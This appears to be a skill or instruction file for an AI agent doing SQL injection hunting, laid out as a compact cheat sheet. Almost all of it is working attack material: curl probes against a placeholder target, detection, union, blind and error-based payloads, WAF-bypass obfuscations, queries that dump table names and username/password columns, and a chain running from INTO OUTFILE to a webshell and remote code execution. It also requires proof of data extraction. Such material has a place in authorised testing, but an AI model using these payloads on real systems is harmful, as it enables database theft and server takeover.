---
name: hunt-sqli
description: SQL injection — error-based, blind, union, time-based, WAF bypass. Must demonstrate data extraction or impact.
---

# SQLI HUNTING — 3 BULLETS MAX

**Core:** SQL syntax injected by attacker is interpreted by database.

## DIFFERENTIAL
```bash
# Normal
curl -s "https://target.com/api/users?id=1"
# Error trigger
curl -s "https://target.com/api/users?id=1'"
# Boolean true (should match baseline)
curl -s "https://target.com/api/users?id=1'+AND+1=1--"
# Boolean false (should differ)
curl -s "https://target.com/api/users?id=1'+AND+1=0--"
```

## PAYLOADS
```
Detection: ' OR '1'='1  ' OR 1=1--  ' UNION SELECT NULL--
Union: ' UNION SELECT username,password FROM users--
Blind: ' AND SLEEP(5)--  ' AND IF(1=1,SLEEP(5),0)--
Error: ' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
WAF: /*!50000SELECT*/  SE/**/LECT  SeLeCt  %27 OR %271%27=%271
```

## DATA EXTRACTION
```bash
curl -s "https://target.com/api/users?id=' UNION SELECT @@version,NULL,NULL--"
curl -s "https://target.com/api/users?id=' UNION SELECT table_name,NULL FROM information_schema.tables--"
curl -s "https://target.com/api/users?id=' UNION SELECT username,password FROM users--"
```

## CHAINS
```
SQLi read → data breach → High
SQLi write → data manipulation → Critical
SQLi INTO OUTFILE → webshell → RCE → Critical
```
